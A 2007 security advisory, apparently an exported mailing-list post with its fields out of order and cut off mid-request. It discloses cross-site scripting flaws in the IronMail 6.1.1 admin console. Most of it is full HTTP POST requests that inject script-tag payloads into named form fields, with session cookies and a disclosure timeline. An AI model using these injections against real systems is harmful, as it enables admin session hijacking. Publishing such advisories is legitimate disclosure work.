/admin/dnsProtection.do=3D;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=3D164&rows%5B0%5D.attrName=3Dsync_time&rows%5B0%5D.attrType=3D2&ro=\nws%5B0%5D.attrValidate=3D%5B1-24%5D&rows%5B0%5D.attrValidateStr=3D%5B1-24=\n%5D&rows%5B0%5D.attrDepends=3D&rows%5B0%5D.multipleValue=3D0&rows%5B0%5D.=\nmodifyable=3Dtrue&rows%5B0%5D.attrValueStrClone=3D24&rows%5B0%5D.langTagI=\nd=3D2016401&rows%5B0%5D.attrValueStr=3D24&rows%5B1%5D.attrName=3Dsync_res=\nults_count&rows%5B1%5D.attrType=3D2&rows%5B1%5D.attrValidate=3D%5B1-500%5=\nD&rows%5B1%5D.attrValidateStr=3D%5B1-500%5D&rows%5B1%5D.attrDepends=3D&ro=\nws%5B1%5D.multipleValue=3D0&rows%5B1%5D.modifyable=3Dtrue&rows%5B1%5D.att=\nrValueStrClone=3D50&rows%5B1%5D.langTagId=3D2016402&rows%5B1%5D.attrValue=\nStr=3D50&rows%5B2%5D.attrName=3Dsync_rules_order&rows%5B2%5D.attrType=3D1=\n&rows%5B2%5D.attrValidate=3D&rows%5B2%5D.attrValidateStr=3D&rows%5B2%5D.a=\nttrDepends=3D&rows%5B2%5D.multipleValue=3D1&rows%5B2%5D.modifyable=3Dtrue=\n&rows%5B2%5D.attrValueStrClone=3D&rows%5B2%5D.langTagId=3D2016403&rows%5B=\n2%5D.attrValue=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&ro=\nws%5B3%5D.attrName=3Dldap_fail_open&rows%5B3%5D.attrType=3D5&rows%5B3%5D.=\nattrValidate=3D&rows%5B3%5D.attrValidateStr=3D&rows%5B3%5D.attrDepends=3D=\n&rows%5B3%5D.multipleValue=3D0&rows%5B3%5D.modifyable=3Dtrue&rows%5B3%5D.=\nattrValueStrClone=3D1&rows%5B3%5D.langTagId=3D2016404&rows%5B3%5D.attrVal=\nue=3Dtrue&rows%5B4%5D.attrName=3Dldap_failure_count&rows%5B4%5D.attrType=3D=\n2&rows%5B4%5D.attrValidate=3D%5B1-50%5D&rows%5B4%5D.attrValidateStr=3D%5B=\n1-50%5D&rows%5B4%5D.attrDepends=3D&rows%5B4%5D.multipleValue=3D0&rows%5B4=\n%5D.modifyable=3Dtrue&rows%5B4%5D.attrValueStrClone=3D3&rows%5B4%5D.langT=\nagId=3D2016405&rows%5B4%5D.attrValueStr=3D3&rows%5B5%5D.attrName=3Dldap_m=\nonitor_intvl&rows%5B5%5D.attrType=3D2&rows%5B5%5D.attrValidate=3D%5B1-144=\n0%5D&rows%5B5%5D.attrValidateStr=3D%5B1-1440%5D&rows%5B5%5D.attrDepends=3D=\n&rows%5B5%5D.multipleValue=3D0&rows%5B5%5D.modifyable=3Dtrue&rows%5B5%5D.=\nattrValueStrClone=3D5&rows%5B5%5D.langTagId=3D2016406&rows%5B5%5D.attrVal=\nueStr=3D5&rows%5B6%5D.attrName=3Dldap_alert_type&rows%5B6%5D.attrType=3D1=\n2&rows%5B6%5D.attrValidate=3D%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+Labe=\nlValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+Labe=\nlValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelV=\nalueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+La=\nbelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=3D30060=\n019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C300=\n60009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=3D&rows%5=\nB6%5D.multipleValue=3D0&rows%5B6%5D.modifyable=3Dtrue&rows%5B6%5D.attrVal=\nueStrClone=3D3&rows%5B6%5D.langTagId=3D2016407&rows%5B6%5D.attrValue=3D3&=\nrows%5B7%5D.attrName=3Dldap_route_aft_masq&rows%5B7%5D.attrType=3D5&rows%=\n5B7%5D.attrValidate=3D&rows%5B7%5D.attrValidateStr=3D&rows%5B7%5D.attrDep=\nends=3D&rows%5B7%5D.multipleValue=3D0&rows%5B7%5D.modifyable=3Dtrue&rows%=\n5B7%5D.attrValueStrClone=3D0&rows%5B7%5D.langTagId=3D2016408&submitValue=3D=\nSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:23:00 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #15 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\nsave\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\ninit&procId=3D164\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2842\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D11;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/ldap_ConfigureService=\nProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLD=\nAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=3D1; /admin/dnsProtection.do=3D;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=3D164&rows%5B0%5D.attrName=3Dsync_time&rows%5B0%5D.attrType=3D2&ro=\nws%5B0%5D.attrValidate=3D%5B1-24%5D&rows%5B0%5D.attrValidateStr=3D%5B1-24=\n%5D&rows%5B0%5D.attrDepends=3D&rows%5B0%5D.multipleValue=3D0&rows%5B0%5D.=\nmodifyable=3Dtrue&rows%5B0%5D.attrValueStrClone=3D24&rows%5B0%5D.langTagI=\nd=3D2016401&rows%5B0%5D.attrValueStr=3D24&rows%5B1%5D.attrName=3Dsync_res=\nults_count&rows%5B1%5D.attrType=3D2&rows%5B1%5D.attrValidate=3D%5B1-500%5=\nD&rows%5B1%5D.attrValidateStr=3D%5B1-500%5D&rows%5B1%5D.attrDepends=3D&ro=\nws%5B1%5D.multipleValue=3D0&rows%5B1%5D.modifyable=3Dtrue&rows%5B1%5D.att=\nrValueStrClone=3D50&rows%5B1%5D.langTagId=3D2016402&rows%5B1%5D.attrValue=\nStr=3D50&rows%5B2%5D.attrName=3Dsync_rules_order&rows%5B2%5D.attrType=3D1=\n&rows%5B2%5D.attrValidate=3D&rows%5B2%5D.attrValidateStr=3D&rows%5B2%5D.a=\nttrDepends=3D&rows%5B2%5D.multipleValue=3D1&rows%5B2%5D.modifyable=3Dtrue=\n&rows%5B2%5D.attrValueStrClone=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3=\nC%2Fscript%3E&rows%5B2%5D.langTagId=3D2016403&rows%5B2%5D.attrValue=3D&ro=\nws%5B3%5D.attrName=3Dldap_fail_open&rows%5B3%5D.attrType=3D5&rows%5B3%5D.=\nattrValidate=3D&rows%5B3%5D.attrValidateStr=3D&rows%5B3%5D.attrDepends=3D=\n&rows%5B3%5D.multipleValue=3D0&rows%5B3%5D.modifyable=3Dtrue&rows%5B3%5D.=\nattrValueStrClone=3D1&rows%5B3%5D.langTagId=3D2016404&rows%5B3%5D.attrVal=\nue=3Dtrue&rows%5B4%5D.attrName=3Dldap_failure_count&rows%5B4%5D.attrType=3D=\n2&rows%5B4%5D.attrValidate=3D%5B1-50%5D&rows%5B4%5D.attrValidateStr=3D%5B=\n1-50%5D&rows%5B4%5D.attrDepends=3D&rows%5B4%5D.multipleValue=3D0&rows%5B4=\n%5D.modifyable=3Dtrue&rows%5B4%5D.attrValueStrClone=3D3&rows%5B4%5D.langT=\nagId=3D2016405&rows%5B4%5D.attrValueStr=3D3&rows%5B5%5D.attrName=3Dldap_m=\nonitor_intvl&rows%5B5%5D.attrType=3D2&rows%5B5%5D.attrValidate=3D%5B1-144=\n0%5D&rows%5B5%5D.attrValidateStr=3D%5B1-1440%5D&rows%5B5%5D.attrDepends=3D=\n&rows%5B5%5D.multipleValue=3D0&rows%5B5%5D.modifyable=3Dtrue&rows%5B5%5D.=\nattrValueStrClone=3D5&rows%5B5%5D.langTagId=3D2016406&rows%5B5%5D.attrVal=\nueStr=3D5&rows%5B6%5D.attrName=3Dldap_alert_type&rows%5B6%5D.attrType=3D1=\n2&rows%5B6%5D.attrValidate=3D%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+Labe=\nlValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+Labe=\nlValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelV=\nalueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+La=\nbelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=3D30060=\n019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C300=\n60009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=3D&rows%5=\nB6%5D.multipleValue=3D0&rows%5B6%5D.modifyable=3Dtrue&rows%5B6%5D.attrVal=\nueStrClone=3D3&rows%5B6%5D.langTagId=3D2016407&rows%5B6%5D.attrValue=3D3&=\nrows%5B7%5D.attrName=3Dldap_route_aft_masq&rows%5B7%5D.attrType=3D5&rows%=\n5B7%5D.attrValidate=3D&rows%5B7%5D.attrValidateStr=3D&rows%5B7%5D.attrDep=\nends=3D&rows%5B7%5D.multipleValue=3D0&rows%5B7%5D.modifyable=3Dtrue&rows%=\n5B7%5D.attrValueStrClone=3D0&rows%5B7%5D.langTagId=3D2016408&submitValue=3D=\nSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:23:16 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #16 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/mailFirewall_MailRoutingInternal.do?method=3D=\nsave\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/mailFirewall_MailRoutingInternal.do?method=3D=\ninit&isMenuToggled=3D1\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 100\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D11;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/mailFirewall_MailRout=\ningInternal.do%3Fmethod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLD=\nAPConfigurationMenu%2CMailRoutingMenu%2C;\n/admin/dnsProtection.dofirsttimeload=3D1; /admin/dnsProtection.do=3D;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\ndtype=3DINBOUND&input1=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscri=\npt%3E&input2=3D&submitValue=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:23:28 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #17 ] :.\n\nPOST https://172.0.0.2:10443/admin/mailIdsConfig.do?method=3Dsave HTTP/1.=\n1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/mailIdsConfig.do?method=3Dinit&isMenuToggle=\nd=3D1&procId=3D90\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2237\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D11;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/mailIdsConfig.do%3Fme=\nthod%3Dinit%26isMenuToggled%3D1%26procId%3D90;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLD=\nAPConfigurationMenu%2CMailRoutingMenu%2CMailIPSMenu%2CApplicationLevelMen=\nu%2CMailIDSMenu%2CApplicationLevelMenu%2C;\n/admin/dnsProtection.dofirsttimeload=3D1; /admin/dnsProtection.do=3D;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=3D10&rows%5B0%5D.attrName=3Dpass_monitor&rows%5B0%5D.attrType=3D5&=\nrows%5B0%5D.attrValidate=3D&rows%5B0%5D.attrValidateStr=3D&rows%5B0%5D.at=\ntrDepends=3D&rows%5B0%5D.multipleValue=3D0&rows%5B0%5D.modifyable=3Dtrue&=\nrows%5B0%5D.attrValueStrClone=3D0&rows%5B0%5D.langTagId=3D2000006&rows%5B=\n1%5D.attrName=3Denable_dos&rows%5B1%5D.attrType=3D5&rows%5B1%5D.attrValid=\nate=3D&rows%5B1%5D.attrValidateStr=3D&rows%5B1%5D.attrDepends=3D&rows%5B1=\n%5D.multipleValue=3D0&rows%5B1%5D.modifyable=3Dtrue&rows%5B1%5D.attrValue=\nStrClone=3D0&rows%5B1%5D.langTagId=3D2000008&rows%5B2%5D.attrName=3Dshm_t=\nimeout&rows%5B2%5D.attrType=3D2&rows%5B2%5D.attrValidate=3D%5B1-65535%5D&=\nrows%5B2%5D.attrValidateStr=3D%5B1-65535%5D&rows%5B2%5D.attrDepends=3D&ro=\nws%5B2%5D.multipleValue=3D0&rows%5B2%5D.modifyable=3Dtrue&rows%5B2%5D.att=\nrValueStrClone=3D100&rows%5B2%5D.langTagId=3D2001009&rows%5B2%5D.attrValu=\neStr=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B3%5D.=\nattrName=3Dshm_spamcount&rows%5B3%5D.attrType=3D2&rows%5B3%5D.attrValidat=\ne=3D%5B1-65535%5D&rows%5B3%5D.attrValidateStr=3D%5B1-65535%5D&rows%5B3%5D=\n=2EattrDepends=3D&rows%5B3%5D.multipleValue=3D0&rows%5B3%5D.modifyable=3D=\ntrue&rows%5B3%5D.attrValueStrClone=3D100&rows%5B3%5D.langTagId=3D2001010&=\nrows%5B3%5D.attrValueStr=3D%27%3E%3Cscript%3Ealert%28%27SIA2%27%29%3C%2Fs=\ncript%3E&rows%5B4%5D.attrName=3Dpasscrackswitch&rows%5B4%5D.attrType=3D5&=\nrows%5B4%5D.attrValidate=3D&rows%5B4%5D.attrValidateStr=3D&rows%5B4%5D.at=\ntrDepends=3D&rows%5B4%5D.multipleValue=3D0&rows%5B4%5D.modifyable=3Dtrue&=\nrows%5B4%5D.attrValueStrClone=3D0&rows%5B4%5D.langTagId=3D2004104&rows%5B=\n5%5D.attrName=3Dpasscrackcount&rows%5B5%5D.attrType=3D2&rows%5B5%5D.attrV=\nalidate=3D%5B1-100%5D&rows%5B5%5D.attrValidateStr=3D%5B1-100%5D&rows%5B5%=\n5D.attrDepends=3D&rows%5B5%5D.multipleValue=3D0&rows%5B5%5D.modifyable=3D=\ntrue&rows%5B5%5D.attrValueStrClone=3D5&rows%5B5%5D.langTagId=3D2004105&ro=\nws%5B5%5D.attrValueStr=3D%27%3E%3Cscript%3Ealert%28%27SIA3%27%29%3C%2Fscr=\nipt%3E&rows%5B6%5D.attrName=3Dpasstimeout&rows%5B6%5D.attrType=3D2&rows%5=\nB6%5D.attrValidate=3D%5B1-3600%5D&rows%5B6%5D.attrValidateStr=3D%5B1-3600=\n%5D&rows%5B6%5D.attrDepends=3D&rows%5B6%5D.multipleValue=3D0&rows%5B6%5D.=\nmodifyable=3Dtrue&rows%5B6%5D.attrValueStrClone=3D60&rows%5B6%5D.langTagI=\nd=3D2004106&rows%5B6%5D.attrValueStr=3D%27%3E%3Cscript%3Ealert%28%27SIA4%=\n27%29%3C%2Fscript%3E&submitValue=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:24:22 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ TIMELINE ] :.\n\n22/Mar/2007 - We publish the advisory.\n07/Mar/2007 - Second contact. Provider doesn''t answered.\n27/Feb/2007  - First contact with provider.\n19/Feb/2007 - Vulnerabilities founded.\n\n--=_gantz-15840-1174901611-0001-2--\n', 'Multiple XSS in IronMail', 'This is a MIME-formatted message.  If you see this text it means that your\nE-mail software does not support MIME-formatted messages.\n\n--=_gantz-15840-1174901611-0001-2\nContent-Type: text/plain; charset=iso-8859-1; format=flowed\n\nFounded multiple XSS in IronMail.\n\nSee attached advisory. Spanish version in http://www.514.es.\n\nRegards,\n\n- J\n\n--=_gantz-15840-1174901611-0001-2\nContent-Type: text/plain; name="SIAADV-07-004-EN.txt"; charset="iso-8859-1"\nContent-Disposition: inline;\n filename="SIAADV-07-004-EN.txt"\n\n          ===============================\n                   - Advisory -\n          ===============================\n  \n  Ttulo:   Multipls XSS in Cypherstrust Ironmail 6.1.1\n    Risk:   Medium\n    Date:   20.Feb.2007\n  Author:   Javier Olascoaga <jolascoaga *at* 514.es>      \n     WEB:   http://www.514.es/\n\n\n.: [ INTRO ] :.\n \nIronMail protects enterprise email systems from inbound threats: spam, viruses;\nor hackers trying to take down or take over the e-mail system. IronMail protects\nenterprise email systems from outbound threats: regulatory compliance violations\n, corporate policy violations, or theft ("leakage") of confidential information \nor intellectual property. IronMail protects enterprise email systems from threats that haven''t even been identified yet. \n\n.: [ TECHNICAL DESCRIPTION ] :.\n\nDuring the development of the technical tests against the IronMail mail system \nhave been detected several Cross Site Scripting vulnerabilities in the \nadministration console of the product.\n\n\nNext you can find the XSS founded:\n\n.: [ XSS #1 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemRouting.do?method=submit HTTP/1.1\nReferer:\nhttps://172.0.0.2:10443/admin/systemRouting.do?method=init&isMenuToggled=1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 295\nCache-Control: no-cache\nCookie: CTSecureToken=53DFBE4753D221B2707050E96902E98D_admin;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/systemRouting.do%3Fmethod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=%2CConfigurationMenu%2C; tabbedMenuSelected=11;\n/admin/queueManager.dofirsttimeload=1; /admin/queueManager.do=;\nJSESSIONID=B227892A258E91419C09469E49AED4D4\n  ''rows%5B0%5D.networkId=172.16.0.0&rows%5B0%5D.netmaskId=255.255.0.0&rows%5B1%5D.networkId=192.168.0.0&rows%5B1%5D.netmaskId=255.255.0.0&network=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&netmask=128.0.0.0&defRouterIp=%27%3E%3Cscript%3Ealert%28%27SIA2%27%29%3C%2Fscript%3E&submit=Submit\n\n\n.: [ XSS #2 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/system_IronMail.do?method=getDetail&isMenuToggled=1\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 343\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3Fmethod%3DgetDetail%26isMenuToggled%3D1;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nWmtu=1500&hostName=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&domainName=sytes.net&ipAddress=10.1.1.1&ipNetMask=255.255.255.224&defaultRouter=10.1.1.2&dns1=10.1.1.3&dns2=10.1.1.4&dns3=10.1.1.5&ntp1=time.nist.gov&ntp2=bitsy.mit.edu&ntp3=clock.isc.org&timeZone=Europe%2FMadrid&ethernetSetting=autoselect&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:11:46 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #3 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 341\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3Fmethod%3DsaveNew;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nUmtu=1500&hostName=mmail11&domainName=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&ipAddress=10.1.1.1&ipNetMask=255.255.255.224&defaultRouter=10.1.1.2&dns1=10.1.1.3&dns2=10.1.1.4&dns3=10.1.1.5&ntp1=time.nist.gov&ntp2=bitsy.mit.edu&ntp3=clock.isc.org&timeZone=Europe%2FMadrid&ethernetSetting=autoselect&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:26 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #4 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 337\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3Fmethod%3DsaveNew;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nQmtu=1500&hostName=mmail11&domainName=sytes.net&ipAddress=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&ipNetMask=255.255.255.224&defaultRouter=10.1.1.2&dns1=10.1.1.3&dns2=10.1.1.4&dns3=10.1.1.5&ntp1=time.nist.gov&ntp2=bitsy.mit.edu&ntp3=clock.isc.org&timeZone=Europe%2FMadrid&ethernetSetting=autoselect&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:31 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #5 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 337\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3Fmethod%3DsaveNew;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nQmtu=1500&hostName=mmail11&domainName=sytes.net&ipAddress=10.1.1.1&ipNetMask=255.255.255.224&defaultRouter=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&dns1=10.1.1.3&dns2=10.1.1.4&dns3=10.1.1.5&ntp1=time.nist.gov&ntp2=bitsy.mit.edu&ntp3=clock.isc.org&timeZone=Europe%2FMadrid&ethernetSetting=autoselect&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:36 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #6 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 338\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: 